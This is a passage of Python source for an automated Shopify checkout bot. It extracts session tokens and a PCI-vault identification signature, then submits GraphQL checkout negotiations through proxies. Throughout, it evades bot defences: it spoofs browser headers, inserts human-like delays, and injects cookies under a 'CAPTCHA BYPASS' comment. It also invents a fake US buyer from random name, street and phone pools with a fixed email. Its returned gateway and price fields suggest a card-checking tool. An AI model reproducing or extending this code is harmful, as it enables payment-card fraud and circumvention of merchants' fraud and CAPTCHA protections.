                            try:
                                import base64 as _b64
                                _decoded_pid = _b64.b64decode(_raw_pid).decode("utf-8")
                                if _decoded_pid.startswith("gid://shopify/Product/"):
                                    storefront_product_gid = _decoded_pid
                                    storefront_product_numeric = _decoded_pid.split("/")[-1]
                                else:
                                    storefront_product_gid = _raw_pid
                                    storefront_product_numeric = _raw_pid
                            except Exception:
                                storefront_product_gid = _raw_pid
                                storefront_product_numeric = _raw_pid.split("/")[-1] if "/" in _raw_pid else _raw_pid
                        else:
                            storefront_product_gid = f'gid://shopify/Product/{product_numeric_id}'
                            storefront_product_numeric = product_numeric_id

                        # Use server-confirmed price/title from cart if available
                        _cart_price = merch.get("priceV2", {})
                        if _cart_price and _cart_price.get("amount"):
                            price = float(_cart_price["amount"])
                        _cart_title = merch.get("title")
                        if _cart_title:
                            product_title = _cart_title

                        # OVERRIDE: Use the server-confirmed IDs
                        # These are authoritative — they came from the Storefront API
                        # which is the same API family as the Checkout Web API.
                        variant_id = storefront_variant_numeric
                        product_numeric_id = storefront_product_numeric

                        print(f'[STEP3] Server-confirmed variant_gid={storefront_variant_gid} product_gid={storefront_product_gid} price={price}', file=sys.stderr)
                    else:
                        storefront_variant_gid = f'gid://shopify/ProductVariant/{product_id_for_cart}'
                        storefront_product_gid = f'gid://shopify/Product/{product_numeric_id}'
                        print(f'[STEP3] No variant ID in cart response, using constructed GIDs', file=sys.stderr)
                else:
                    storefront_variant_gid = f'gid://shopify/ProductVariant/{product_id_for_cart}'
                    storefront_product_gid = f'gid://shopify/Product/{product_numeric_id}'
                    print(f'[STEP3] No cart lines, using constructed GIDs', file=sys.stderr)
            except (json.JSONDecodeError, KeyError, TypeError, AttributeError) as e:
                preview = cart_create_resp.text[:300]
                return False, f"CartCreate parse error: {str(e)}", gateway, total_price, currency

            print(f'[STEP3] checkout_url={checkout_url[:80]}...', file=sys.stderr)

            await human_delay(step_name="cart_create")

            # ======== STEP 4: GET CHECKOUT PAGE → extract ALL tokens ========
            # Pre-extract source_token from cart URL (before we fetch the checkout page)
            # Cart URL format: /cart/c/{source_token}?key=... 
            # or /checkouts/cn/{source_token}/...
            _cart_source_match = re.search(r'/cart/c/([A-Za-z0-9_\-]+)', checkout_url)
            if _cart_source_match:
                source_token = _cart_source_match.group(1)
                print(f'[STEP4] Pre-extracted source_token from cart URL: {source_token[:16]}...', file=sys.stderr)

            checkout_get_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'sec-ch-ua': hints['sec_ch_ua'],
                'sec-ch-ua-mobile': mobile,
                'sec-ch-ua-platform': f'"{clienthint}"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': mobile,
                'upgrade-insecure-requests': '1',
                'user-agent': hints['ua'],
            }
            # Inject session cookies into checkout page GET (prevents bot detection)
            _ck_get = _cookie_header()
            if _ck_get:
                checkout_get_headers['cookie'] = _ck_get

            # --- NEW: Fetch cart URL WITHOUT following redirects to capture shop_pay_token JWT ---
            # The 302 redirect to shop.app contains a JWT with the real session_token
            x_checkout_one_session_token = None
            source_token = source_token if source_token else None  # keep pre-extracted token if available
            checkout_domain = ourl
            build_id = ''
            currency = 'USD'
            countryCode = 'US'
            source_type = 'cn'
            checkout_session_id = ''
            checkout_text = ''  # HTML of checkout page (set in fallback if JWT redirect fails)
            _caller_id_sig = ''  # Shopify-Identification-Signature for PCI vault

            try:
                cart_redir_resp = await session.get(
                    checkout_url,
                    headers=checkout_get_headers,
                    params={'auto_redirect': 'false', 'skip_shop_pay': 'true'},
                    proxy=proxy, allow_redirects=False, timeout=20
                )
                redir_status = cart_redir_resp.status_code
                _absorb_cookies(cart_redir_resp)
                location_hdr = cart_redir_resp.headers.get('location', '') or ''

                if redir_status in (301, 302, 303, 307, 308) and 'shop_pay_token=' in location_hdr:
                    # Extract shop_pay_token JWT from Location header
                    import base64 as _b64
                    _jwt_match = re.search(r'shop_pay_token=([^&]+)', location_hdr)
                    if _jwt_match:
                        import urllib.parse as _urlp
                        _jwt = _urlp.unquote(_jwt_match.group(1))
                        _parts = _jwt.split('.')
                        if len(_parts) >= 2:
                            _pad = '=' * ((-len(_parts[1])) % 4)
                            try:
                                _payload = json.loads(_b64.urlsafe_b64decode(_parts[1] + _pad).decode('utf-8'))
                                _st = _payload.get('session_token', '')
                                if _st:
                                    x_checkout_one_session_token = _st
                            except Exception:
                                pass

                    # Extract ur_back_url for source_token + checkout_domain
                    _back_match = re.search(r'ur_back_url=([^&]+)', location_hdr)
                    if _back_match:
                        import urllib.parse as _urlp2
                        _back_url = _urlp2.unquote(_back_match.group(1))
                        _st_m = re.search(r'/checkouts/(?:cn|web|unstable)/([A-Za-z0-9_\-]+)', _back_url)
                        if _st_m:
                            source_token = _st_m.group(1)
                        _dom_m = re.search(r'https?://([^/]+)', _back_url)
                        if _dom_m:
                            checkout_domain = f'https://{_dom_m.group(1)}'
            except Exception as _e:
                print(f'[STEP4] redirect extraction error: {_e}', file=sys.stderr)

            # --- STEP 4b: Fetch checkout HTML to get Shopify-Identification-Signature ---
            # When JWT redirect path succeeds, we still need the checkout page HTML
            # to extract checkoutCardsinkCallerIdentificationSignature.
            # This signature is bound to our checkout session and must be sent with the
            # PCI vault tokenization request to authenticate it.
            # We fetch the actual checkout page using our session (which has the cart cookie).
            if x_checkout_one_session_token and not checkout_text:
                try:
                    _html_checkout_url = checkout_url
                    # If we have checkout_domain and source_token, build the direct checkout page URL
                    if checkout_domain and checkout_domain != ourl and source_token:
                        _html_checkout_url = f'{checkout_domain}/checkouts/unstable/c/{source_token}'
                    _html_resp, _ = await retry_on_429(
                        lambda: session.get(
                            _html_checkout_url,
                            headers={
                                **checkout_get_headers,
                                'authorization': f'Bearer {x_checkout_one_session_token}',
                                'x-checkout-one-session-token': x_checkout_one_session_token,
                            },
                            params={'auto_redirect': 'false', 'skip_shop_pay': 'true'},
                            proxy=proxy, allow_redirects=True, timeout=20
                        ),
                        step_name="checkout_html", max_retries=1, base_delay=2.0, max_delay=8.0
                    )
                    if _html_resp and _html_resp.status_code == 200:
                        _absorb_cookies(_html_resp)
                        checkout_text = _html_resp.text
                        _caller_id_sig = (
                            extract_between(checkout_text, 'checkoutCardsinkCallerIdentificationSignature&quot;:&quot;', '&quot')
                            or extract_between(checkout_text, '"checkoutCardsinkCallerIdentificationSignature":"', '"')
                        )
                        if _caller_id_sig:
                            print(f'[STEP4b] Got caller identification signature ({len(_caller_id_sig)} chars)', file=sys.stderr)
                        else:
                            print('[STEP4b] Checkout page fetched but no identification signature found', file=sys.stderr)
                    else:
                        _status = getattr(_html_resp, 'status_code', '?') if _html_resp else 'None'
                        print(f'[STEP4b] Checkout page fetch returned HTTP {_status}', file=sys.stderr)
                except Exception as _e4b:
                    print(f'[STEP4b] Checkout HTML fetch error: {_e4b}', file=sys.stderr)

            # --- FALLBACK: Follow redirects and try meta tags (legacy SSR checkout) ---
            if not x_checkout_one_session_token:
                try:
                    checkout_resp, _ = await retry_on_429(
                        lambda: session.get(
                            checkout_url,
                            headers=checkout_get_headers,
                            params={'auto_redirect': 'false', 'skip_shop_pay': 'true'},
                            proxy=proxy, allow_redirects=True, timeout=20
                        ),
                        step_name="checkout_page", max_retries=5, base_delay=5.0, max_delay=20.0
                    )
                    # If checkout page still failed (too many 429s), try /checkouts/cn/ path directly
                    if checkout_resp.status_code == 429:
                        _cn_url = f'{checkout_domain}/checkouts/cn/{source_token}/en-us'
                        print(f'[CHECKOUT_FALLBACK] Trying /checkouts/cn/ path: {_cn_url[:80]}', file=sys.stderr)
                        try:
                            checkout_resp, _ = await retry_on_429(
                                lambda: session.get(
                                    _cn_url,
                                    headers={**checkout_get_headers, 'sec-fetch-site': 'none'},
                                    params={'auto_redirect': 'false', 'skip_shop_pay': 'true', 'edge_redirect': 'true'},
                                    proxy=proxy, allow_redirects=True, timeout=20
                                ),
                                step_name="checkout_cn_fallback", max_retries=3, base_delay=6.0, max_delay=20.0
                            )
                        except Exception as _fe:
                            print(f'[CHECKOUT_FALLBACK] Failed: {_fe}', file=sys.stderr)
                    checkout_text = checkout_resp.text
                    _checkout_resp_url = str(getattr(checkout_resp, "url", checkout_url))
                    from urllib.parse import urlparse as _urlparse2
                    _parsed_co = _urlparse2(_checkout_resp_url)
                    if _parsed_co.netloc:
                        checkout_domain = f'{_parsed_co.scheme}://{_parsed_co.netloc}'
                    # Try legacy meta tags
                    _st_raw = (extract_meta_content(checkout_text, 'serialized-sessionToken')
                               or extract_between(checkout_text, 'name="serialized-sessionToken" content="', '"')
                               or extract_between(checkout_text, '"serializedSessionToken":"', '"'))
                    if _st_raw:
                        x_checkout_one_session_token = _st_raw.replace('&quot;', '').strip('"').strip()
                    # source_token from meta
                    if not source_token:
                        _src = extract_meta_content(checkout_text, 'serialized-sourceToken')
                        source_token = _src.strip('"') if _src else ''
                    # source_token from URL if still missing
                    if not source_token:
                        _st_url_m = re.search(r'/checkouts/(?:cn|web|unstable)/([A-Za-z0-9_\-]+)', _checkout_resp_url)
                        if _st_url_m:
                            source_token = _st_url_m.group(1)
                    # Build ID from meta
                    _env_json = extract_meta_content(checkout_text, 'serialized-environment')
                    if _env_json:
                        try:
                            _env = json.loads(_env_json)
                            build_id = _env.get('commitSha', '')
                        except Exception:
                            pass
                    # Currency
                    _cur = extract_meta_content(checkout_text, 'serialized-currencyCode')
                    if _cur and len(_cur) <= 5:
                        currency = _cur.strip('"')
                    # Country
                    _cc = extract_meta_content(checkout_text, 'serialized-countryCode')
                    if _cc and len(_cc) <= 3:
                        countryCode = _cc.strip('"')
                except Exception as _e2:
                    print(f'[STEP4] fallback meta extraction error: {_e2}', file=sys.stderr)

            if not x_checkout_one_session_token:
                return False, "SESSION_TOKEN_MISSING: Could not extract checkout session token (tried JWT+meta)", gateway, total_price, currency

            # source_token fallback to cart URL token
            if not source_token:
                _st_m2 = re.search(r'/cart/c/([A-Za-z0-9_\-]+)', checkout_url)
                source_token = _st_m2.group(1) if _st_m2 else ''

            print(f'[STEP4] session_token={x_checkout_one_session_token[:20]}... source={source_token} domain={checkout_domain}', file=sys.stderr)
            await human_delay(step_name="checkout_page")

            # Initialized here; populated by STEP5 for use in STEP6
            _s5_digest = ''
            _s5_variant_gid = ''
            _s5_stable_ids = []

            # ======== STEP 5: EMPTY NEGOTIATE → get initial queueToken + state ========
            graphql_url = f'{checkout_domain}/checkouts/unstable/graphql'

            checkout_web_headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': f'Bearer {x_checkout_one_session_token}',
                'content-type': 'application/json',
                'origin': checkout_domain,
                'referer': checkout_url,
                'sec-ch-ua': hints['sec_ch_ua'],
                'sec-ch-ua-mobile': mobile,
                'sec-ch-ua-platform': f'"{clienthint}"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': hints['ua'],
                'x-checkout-one-session-token': x_checkout_one_session_token,
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-source-id': source_token,
                'x-checkout-web-server-rendering': 'yes',
                'x-checkout-web-server-handling': 'fast',
                'shopify-checkout-client': 'checkout-web/1.0',
                'sec-ch-viewport-width': '1280',
            }
            if build_id:
                checkout_web_headers['x-checkout-web-build-id'] = build_id
            # CAPTCHA BYPASS: inject session cookies so Shopify skips hCaptcha
            _ck = _cookie_header()
            if _ck:
                checkout_web_headers['cookie'] = _ck
                print(f'[COOKIES] Injected into headers: {list(_session_cookies.keys())}', file=sys.stderr)

            def _sync_cookie_header():
                _ck = _cookie_header()
                if _ck:
                    checkout_web_headers['cookie'] = _ck

            def _refresh_session_token(resp):
                """Refresh session token from response headers."""
                nonlocal x_checkout_one_session_token, checkout_web_headers
                new_token = resp.headers.get('x-checkout-one-session-token') or resp.headers.get('X-Checkout-One-Session-Token')
                if new_token:
                    x_checkout_one_session_token = new_token
                    checkout_web_headers['x-checkout-one-session-token'] = x_checkout_one_session_token
                    checkout_web_headers['authorization'] = f'Bearer {x_checkout_one_session_token}'
                _absorb_cookies(resp)
                _sync_cookie_header()

            # ── Realistic random US address generator ──────────────────────
            # Real city/ZIP/state combos + realistic street names/numbers
            _VALID_ADDRESSES = [
                # New York
                {'city': 'New York',        'state': 'NY', 'zip': '10025', 'area': '212'},
                {'city': 'Brooklyn',        'state': 'NY', 'zip': '11201', 'area': '718'},
                {'city': 'Queens',          'state': 'NY', 'zip': '11375', 'area': '718'},
                {'city': 'Bronx',           'state': 'NY', 'zip': '10456', 'area': '718'},
                {'city': 'Yonkers',         'state': 'NY', 'zip': '10701', 'area': '914'},
                {'city': 'Buffalo',         'state': 'NY', 'zip': '14201', 'area': '716'},
                # California
                {'city': 'Los Angeles',     'state': 'CA', 'zip': '90027', 'area': '323'},
                {'city': 'San Diego',       'state': 'CA', 'zip': '92101', 'area': '619'},
                {'city': 'San Jose',        'state': 'CA', 'zip': '95112', 'area': '408'},
                {'city': 'San Francisco',   'state': 'CA', 'zip': '94103', 'area': '415'},
                {'city': 'Fresno',          'state': 'CA', 'zip': '93701', 'area': '559'},
                {'city': 'Sacramento',      'state': 'CA', 'zip': '95814', 'area': '916'},
                {'city': 'Long Beach',      'state': 'CA', 'zip': '90802', 'area': '562'},
                {'city': 'Oakland',         'state': 'CA', 'zip': '94601', 'area': '510'},
                # Texas
                {'city': 'Houston',         'state': 'TX', 'zip': '77006', 'area': '713'},
                {'city': 'San Antonio',     'state': 'TX', 'zip': '78201', 'area': '210'},
                {'city': 'Dallas',          'state': 'TX', 'zip': '75201', 'area': '214'},
                {'city': 'Austin',          'state': 'TX', 'zip': '78701', 'area': '512'},
                {'city': 'Fort Worth',      'state': 'TX', 'zip': '76102', 'area': '817'},
                {'city': 'El Paso',         'state': 'TX', 'zip': '79901', 'area': '915'},
                {'city': 'Arlington',       'state': 'TX', 'zip': '76010', 'area': '817'},
                # Florida
                {'city': 'Jacksonville',    'state': 'FL', 'zip': '32202', 'area': '904'},
                {'city': 'Miami',           'state': 'FL', 'zip': '33101', 'area': '305'},
                {'city': 'Tampa',           'state': 'FL', 'zip': '33602', 'area': '813'},
                {'city': 'Orlando',         'state': 'FL', 'zip': '32801', 'area': '407'},
                {'city': 'St. Petersburg',  'state': 'FL', 'zip': '33701', 'area': '727'},
                {'city': 'Hialeah',         'state': 'FL', 'zip': '33010', 'area': '305'},
                # Illinois
                {'city': 'Chicago',         'state': 'IL', 'zip': '60614', 'area': '773'},
                {'city': 'Aurora',          'state': 'IL', 'zip': '60505', 'area': '630'},
                {'city': 'Naperville',      'state': 'IL', 'zip': '60540', 'area': '630'},
                {'city': 'Rockford',        'state': 'IL', 'zip': '61101', 'area': '815'},
                # Pennsylvania
                {'city': 'Philadelphia',    'state': 'PA', 'zip': '19103', 'area': '215'},
                {'city': 'Pittsburgh',      'state': 'PA', 'zip': '15201', 'area': '412'},
                {'city': 'Allentown',       'state': 'PA', 'zip': '18101', 'area': '610'},
                # Ohio
                {'city': 'Columbus',        'state': 'OH', 'zip': '43215', 'area': '614'},
                {'city': 'Cleveland',       'state': 'OH', 'zip': '44113', 'area': '216'},
                {'city': 'Cincinnati',      'state': 'OH', 'zip': '45202', 'area': '513'},
                {'city': 'Toledo',          'state': 'OH', 'zip': '43604', 'area': '419'},
                # Georgia
                {'city': 'Atlanta',         'state': 'GA', 'zip': '30301', 'area': '404'},
                {'city': 'Augusta',         'state': 'GA', 'zip': '30901', 'area': '706'},
                {'city': 'Savannah',        'state': 'GA', 'zip': '31401', 'area': '912'},
                # North Carolina
                {'city': 'Charlotte',       'state': 'NC', 'zip': '28201', 'area': '704'},
                {'city': 'Raleigh',         'state': 'NC', 'zip': '27601', 'area': '919'},
                {'city': 'Greensboro',      'state': 'NC', 'zip': '27401', 'area': '336'},
                # Michigan
                {'city': 'Detroit',         'state': 'MI', 'zip': '48201', 'area': '313'},
                {'city': 'Grand Rapids',    'state': 'MI', 'zip': '49501', 'area': '616'},
                {'city': 'Warren',          'state': 'MI', 'zip': '48091', 'area': '586'},
                # Washington
                {'city': 'Seattle',         'state': 'WA', 'zip': '98103', 'area': '206'},
                {'city': 'Spokane',         'state': 'WA', 'zip': '99201', 'area': '509'},
                {'city': 'Tacoma',          'state': 'WA', 'zip': '98402', 'area': '253'},
                # Arizona
                {'city': 'Phoenix',         'state': 'AZ', 'zip': '85003', 'area': '602'},
                {'city': 'Tucson',          'state': 'AZ', 'zip': '85701', 'area': '520'},
                {'city': 'Mesa',            'state': 'AZ', 'zip': '85201', 'area': '480'},
                {'city': 'Chandler',        'state': 'AZ', 'zip': '85225', 'area': '480'},
                # Indiana
                {'city': 'Indianapolis',    'state': 'IN', 'zip': '46201', 'area': '317'},
                {'city': 'Fort Wayne',      'state': 'IN', 'zip': '46801', 'area': '260'},
                {'city': 'Evansville',      'state': 'IN', 'zip': '47708', 'area': '812'},
                # Tennessee
                {'city': 'Nashville',       'state': 'TN', 'zip': '37201', 'area': '615'},
                {'city': 'Memphis',         'state': 'TN', 'zip': '38103', 'area': '901'},
                {'city': 'Knoxville',       'state': 'TN', 'zip': '37902', 'area': '865'},
                # Missouri
                {'city': 'Kansas City',     'state': 'MO', 'zip': '64108', 'area': '816'},
                {'city': 'St. Louis',       'state': 'MO', 'zip': '63103', 'area': '314'},
                # Maryland
                {'city': 'Baltimore',       'state': 'MD', 'zip': '21201', 'area': '410'},
                {'city': 'Frederick',       'state': 'MD', 'zip': '21701', 'area': '301'},
                # Colorado
                {'city': 'Denver',          'state': 'CO', 'zip': '80202', 'area': '303'},
                {'city': 'Colorado Springs','state': 'CO', 'zip': '80903', 'area': '719'},
                {'city': 'Aurora',          'state': 'CO', 'zip': '80010', 'area': '303'},
                # Oregon
                {'city': 'Portland',        'state': 'OR', 'zip': '97201', 'area': '503'},
                {'city': 'Salem',           'state': 'OR', 'zip': '97301', 'area': '503'},
                {'city': 'Eugene',          'state': 'OR', 'zip': '97401', 'area': '541'},
                # Nevada
                {'city': 'Las Vegas',       'state': 'NV', 'zip': '89101', 'area': '702'},
                {'city': 'Henderson',       'state': 'NV', 'zip': '89002', 'area': '702'},
                {'city': 'Reno',            'state': 'NV', 'zip': '89501', 'area': '775'},
                # Virginia
                {'city': 'Virginia Beach',  'state': 'VA', 'zip': '23451', 'area': '757'},
                {'city': 'Norfolk',         'state': 'VA', 'zip': '23510', 'area': '757'},
                {'city': 'Richmond',        'state': 'VA', 'zip': '23220', 'area': '804'},
                {'city': 'Arlington',       'state': 'VA', 'zip': '22201', 'area': '703'},
                # Wisconsin
                {'city': 'Milwaukee',       'state': 'WI', 'zip': '53202', 'area': '414'},
                {'city': 'Madison',         'state': 'WI', 'zip': '53703', 'area': '608'},
                # Minnesota
                {'city': 'Minneapolis',     'state': 'MN', 'zip': '55401', 'area': '612'},
                {'city': 'St. Paul',        'state': 'MN', 'zip': '55101', 'area': '651'},
                # Louisiana
                {'city': 'New Orleans',     'state': 'LA', 'zip': '70112', 'area': '504'},
                {'city': 'Baton Rouge',     'state': 'LA', 'zip': '70801', 'area': '225'},
                # Alabama
                {'city': 'Birmingham',      'state': 'AL', 'zip': '35203', 'area': '205'},
                {'city': 'Montgomery',      'state': 'AL', 'zip': '36104', 'area': '334'},
                # South Carolina
                {'city': 'Columbia',        'state': 'SC', 'zip': '29201', 'area': '803'},
                {'city': 'Charleston',      'state': 'SC', 'zip': '29403', 'area': '843'},
                # Kentucky
                {'city': 'Louisville',      'state': 'KY', 'zip': '40202', 'area': '502'},
                {'city': 'Lexington',       'state': 'KY', 'zip': '40508', 'area': '859'},
                # Massachusetts
                {'city': 'Boston',          'state': 'MA', 'zip': '02101', 'area': '617'},
                {'city': 'Worcester',       'state': 'MA', 'zip': '01601', 'area': '508'},
                {'city': 'Springfield',     'state': 'MA', 'zip': '01103', 'area': '413'},
                # New Jersey
                {'city': 'Newark',          'state': 'NJ', 'zip': '07102', 'area': '973'},
                {'city': 'Jersey City',     'state': 'NJ', 'zip': '07302', 'area': '201'},
                {'city': 'Trenton',         'state': 'NJ', 'zip': '08608', 'area': '609'},
                # Connecticut
                {'city': 'Bridgeport',      'state': 'CT', 'zip': '06604', 'area': '203'},
                {'city': 'New Haven',       'state': 'CT', 'zip': '06510', 'area': '203'},
                {'city': 'Hartford',        'state': 'CT', 'zip': '06103', 'area': '860'},
                # Iowa
                {'city': 'Des Moines',      'state': 'IA', 'zip': '50309', 'area': '515'},
                {'city': 'Cedar Rapids',    'state': 'IA', 'zip': '52401', 'area': '319'},
                # Oklahoma
                {'city': 'Oklahoma City',   'state': 'OK', 'zip': '73102', 'area': '405'},
                {'city': 'Tulsa',           'state': 'OK', 'zip': '74103', 'area': '918'},
                # Arkansas
                {'city': 'Little Rock',     'state': 'AR', 'zip': '72201', 'area': '501'},
                # Utah
                {'city': 'Salt Lake City',  'state': 'UT', 'zip': '84101', 'area': '801'},
                {'city': 'West Valley City','state': 'UT', 'zip': '84120', 'area': '801'},
                # New Mexico
                {'city': 'Albuquerque',     'state': 'NM', 'zip': '87102', 'area': '505'},
                {'city': 'Santa Fe',        'state': 'NM', 'zip': '87501', 'area': '505'},
            ]
            _addr = random.choice(_VALID_ADDRESSES)

            # Realistic first/last names (much larger pool)
            _FIRST_NAMES_M = ['James','John','Robert','Michael','William','David','Richard','Joseph','Thomas','Charles',
                              'Christopher','Daniel','Matthew','Anthony','Mark','Donald','Steven','Andrew','Paul','Joshua',
                              'Kevin','Brian','George','Edward','Ronald','Timothy','Jason','Jeffrey','Ryan','Jacob']
            _FIRST_NAMES_F = ['Mary','Patricia','Jennifer','Linda','Barbara','Elizabeth','Susan','Jessica','Sarah','Karen',
                              'Lisa','Nancy','Betty','Margaret','Sandra','Ashley','Dorothy','Kimberly','Emily','Donna',
                              'Michelle','Carol','Amanda','Melissa','Deborah','Stephanie','Rebecca','Sharon','Laura','Cynthia']
            _LAST_NAMES = ['Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis','Rodriguez','Martinez',
                           'Hernandez','Lopez','Gonzalez','Wilson','Anderson','Thomas','Taylor','Moore','Jackson','Martin',
                           'Lee','Perez','Thompson','White','Harris','Sanchez','Clark','Ramirez','Lewis','Robinson',
                           'Walker','Young','Allen','King','Wright','Scott','Torres','Nguyen','Hill','Flores',
                           'Green','Adams','Nelson','Baker','Hall','Rivera','Campbell','Mitchell','Carter','Roberts']

            # Realistic street name components
            _ST_NUMS = list(range(100, 9999))
            _ST_NAMES = ['Washington','Lincoln','Jefferson','Madison','Adams','Monroe','Jackson','Harrison',
                         'Oak','Maple','Cedar','Pine','Elm','Willow','Birch','Walnut','Cherry','Ash',
                         'Park','Lake','Hill','Ridge','Valley','Glen','Brook','Creek','River','Forest',
                         'Sunset','Sunrise','Meadow','Garden','Spring','Summer','Autumn','Winter',
                         'Highland','Lakewood','Greenwood','Fairview','Oakwood','Maplewood','Hillside',
                         'Church','School','College','University','Central','Market','Commerce','Industrial',
                         '1st','2nd','3rd','4th','5th','6th','7th','8th','9th','10th',
                         'North','South','East','West','Grand','Royal','Imperial','Liberty','Freedom',
                         'Heritage','Colonial','Pioneer','Frontier','Patriot','Union','Federal']
            _ST_TYPES = ['St', 'Ave', 'Blvd', 'Dr', 'Rd', 'Ln', 'Ct', 'Pl', 'Way', 'Ter']

            _use_female = random.random() < 0.45
            firstName = random.choice(_FIRST_NAMES_F if _use_female else _FIRST_NAMES_M)
            lastName = random.choice(_LAST_NAMES)
            _st_num = random.randint(100, 9998)
            _st_name = random.choice(_ST_NAMES)
            _st_type = random.choice(_ST_TYPES)
            street = f'{_st_num} {_st_name} {_st_type}'
            city = _addr['city']
            state = _addr['state']
            s_zip = _addr['zip']
            country_code = 'US'
            # Real-looking phone: area code + valid 7-digit (2nd digit not 0 or 1)
            _ph_mid = random.randint(200, 999)
            _ph_end = random.randint(1000, 9999)
            phone = f'{_addr["area"]}{_ph_mid:03d}{_ph_end:04d}'
            email = 'xynnot61@outlook.com'  # Fixed checkout email

            # --- Step 5a: Empty negotiate ---
            proposal_empty_data = {
                'query': QUERY_PROPOSAL,
                'variables': {
                    'input': {},
                },
                'operationName': 'Proposal',
            }

            p_empty_resp, _ = await retry_on_429(
                lambda: session.post(
                    graphql_url,
                    params={'operationName': 'Proposal'},
                    headers=checkout_web_headers,
                    json=proposal_empty_data,
                    proxy=proxy, timeout=20, allow_redirects=True
                ),
                step_name="proposal_empty", max_retries=2, base_delay=3.0, max_delay=12.0
            )

            queue_token = ''  # Initialize before use

            if p_empty_resp and p_empty_resp.status_code == 200:
                _refresh_session_token(p_empty_resp)
                try:
                    p_empty_json = json.loads(p_empty_resp.text)
                    # Debug: check for GraphQL errors
                    if 'errors' in p_empty_json and not p_empty_json.get('data'):
                        _gql_errs = p_empty_json.get('errors', [])
                        _gql_msgs = [e.get('message', str(e))[:80] for e in _gql_errs[:3]]
                        print(f'[STEP5a] GraphQL errors: {_gql_msgs}', file=sys.stderr)
                    else:
                        p_empty_parsed = _parse_negotiate_response(p_empty_json)
                        if p_empty_parsed['queue_token']:
                            queue_token = p_empty_parsed['queue_token']
                        if p_empty_parsed['session_token']:
                            x_checkout_one_session_token = p_empty_parsed['session_token']
                            checkout_web_headers['x-checkout-one-session-token'] = x_checkout_one_session_token
                            checkout_web_headers['authorization'] = f'Bearer {x_checkout_one_session_token}'
                        # Capture server-confirmed merchandise digest & stable IDs
                        _s5_digest = p_empty_parsed.get('seller_digest') or ''
                        _s5_variant_gid = p_empty_parsed.get('seller_variant_id') or ''
                        _s5_stable_ids = p_empty_parsed.get('stable_ids') or []
                        if _s5_digest:
                            print(f'[STEP5a] digest={_s5_digest} stable_ids={_s5_stable_ids}', file=sys.stderr)
                        print(f'[STEP5a] result_type={p_empty_parsed["result_type"]} queueToken={bool(p_empty_parsed["queue_token"])}', file=sys.stderr)
                except (json.JSONDecodeError, KeyError, TypeError, AttributeError) as e:
                    print(f'[STEP5a] Parse error: {e}', file=sys.stderr)

            await human_delay(step_name="proposal_empty")

            # ======== STEP 6: FULL NEGOTIATE with buyerIdentity + merchandise + delivery ========
            # This is the critical step that combines buyer identity, merchandise,
            # and delivery in one negotiate call. NO payment yet — that comes later.
            # 
            # KEY SCHEMA FIXES:
            # - merchandise uses sourceProvidedMerchandise (NOT stableId or productVariantReference)
            # - delivery.destination.streetAddress uses address1/zoneCode/postalCode
            # - delivery.targetMerchandiseLines uses {any: true}
            # - delivery.selectedDeliveryStrategy uses deliveryStrategyByHandle
            # - delivery.noDeliveryRequired is [] when shipping is required
            # - buyerIdentity has NO deliveryAddress field

            # Build merchandise line.
            # If we got a digest from STEP5, use productVariantReference (no signature check).
            # Otherwise fall back to sourceProvidedMerchandise.
            # Use stableId from STEP5 if available
            _use_stable_id = _s5_stable_ids[0] if _s5_stable_ids else ''
            merch_line = _build_merchandise_line(
                variant_id=variant_id or product_id_for_cart,
                product_id=product_numeric_id,
                price=price,
                currency=currency,
                title=product_title,
                requires_shipping=requires_shipping,
                quantity=1,
            )
            if _use_stable_id:
                merch_line = {**merch_line, 'stableId': _use_stable_id}
            print(f'[STEP6] sourceProvidedMerchandise stable={_use_stable_id[:12] if _use_stable_id else "none"}', file=sys.stderr)

                        # Build delivery terms
            if requires_shipping:
                delivery_line = _build_delivery_line(
                    currency=currency,
                    first_name=firstName,
                    last_name=lastName,
                    street=street,
                    city=city,
                    country_code=country_code,
                    zone_code=state,
                    postal_code=s_zip,
                    phone=phone,
                    shipping_handle='shipping',
                    shipping_amount=None,  # Use {any: true} — we don't know shipping cost yet
                )
                delivery_terms = _build_delivery_terms(
                    delivery_lines=[delivery_line],
                    no_delivery_required=[],  # REQUIRED: pass [] when shipping IS needed
                )
            else:
                delivery_terms = _build_delivery_terms(
                    delivery_lines=[],
                    no_delivery_required=[],  # Will be updated with stableIds after we get them
                )

            proposal1_data = {
                'query': QUERY_PROPOSAL,
                'variables': {
                    'input': {
                        'purchaseProposal': {
                            'buyerIdentity': {
                                'email': email,
                                'emailChanged': False,
                                'phoneCountryCode': country_code,
                                'marketingConsent': [],
                                'shopPayOptInPhone': {'countryCode': country_code},
                                'rememberMe': False,
                            },
                            'merchandise': {
                                'merchandiseLines': [merch_line],
                            },
                            'delivery': delivery_terms,
                        },
                        'queueToken': queue_token or '',
                    },
                },
                'operationName': 'Proposal',
            }

            p1_resp, _ = await retry_on_429(
                lambda: session.post(
                    graphql_url,
                    params={'operationName': 'Proposal'},
                    headers=checkout_web_headers,
                    json=proposal1_data,
                    proxy=proxy, timeout=20, allow_redirects=True
                ),
                step_name="proposal1", max_retries=2, base_delay=3.0, max_delay=12.0
            )

            if not p1_resp or p1_resp.status_code != 200:
                _status = p1_resp.status_code if p1_resp else 'N/A'
                return False, f"PROPOSAL_BLOCKED: HTTP {_status}", gateway, total_price, currency

            p1_text = p1_resp.text

            # Debug: Log the FULL raw negotiate response to discover delivery type names
            print(f'[PROPOSAL1_RAW] Response (first 2000): {p1_text[:2000]}', file=sys.stderr)

            if is_captcha_required(p1_text):
                return False, "CAPTCHA_REQUIRED on proposal 1", gateway, total_price, currency

            _refresh_session_token(p1_resp)

            # Parse Proposal 1
            try:
                p1_json = json.loads(p1_text)
                if 'errors' in p1_json and not p1_json.get('data'):
                    _top_errs = p1_json.get('errors', [])
                    _top_msgs = [e.get('message', str(e)) for e in _top_errs[:3]]
                    return False, f"PROPOSAL_JSON_ERROR: {'; '.join(_top_msgs)}", gateway, total_price, currency

                p1_parsed = _parse_negotiate_response(p1_json)
            except (json.JSONDecodeError, KeyError, TypeError, AttributeError) as e:
                return False, f"PROPOSAL_JSON_ERROR: {str(e)}", gateway, total_price, currency

